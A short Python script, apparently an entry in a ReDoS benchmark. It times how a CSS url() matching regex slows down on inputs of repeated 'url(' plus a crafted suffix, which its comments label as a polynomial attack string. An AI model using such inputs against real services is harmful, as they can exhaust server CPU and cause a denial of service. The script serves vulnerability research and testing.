# 8106
# url\(\s*(?:(?:("(?!(['"]+))(?!(((data|http(s)*):)|\s*"))[^'"]*")|(?:('(?!(['"]+))(?!(((data|http(s)*):)|\s*'))[^'"]*'))|(?:((?!(['"\s]+))(?!(((data|http(s)*):)|\s*')).*[^'"]))))\s*\)
# POLYNOMIAL
# nums:4
# POLYNOMIAL AttackString:""+"url("*5000+"!_1SLQ_2"

import re
from time import perf_counter

regex = """url\(\s*(?:(?:("(?!(['"]+))(?!(((data|http(s)*):)|\s*"))[^'"]*")|(?:('(?!(['"]+))(?!(((data|http(s)*):)|\s*'))[^'"]*'))|(?:((?!(['"\s]+))(?!(((data|http(s)*):)|\s*')).*[^'"]))))\s*\)"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "" + "url(" * i * 10000 + "!_1SLQ_2"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *10000}: took {DURATION} seconds!")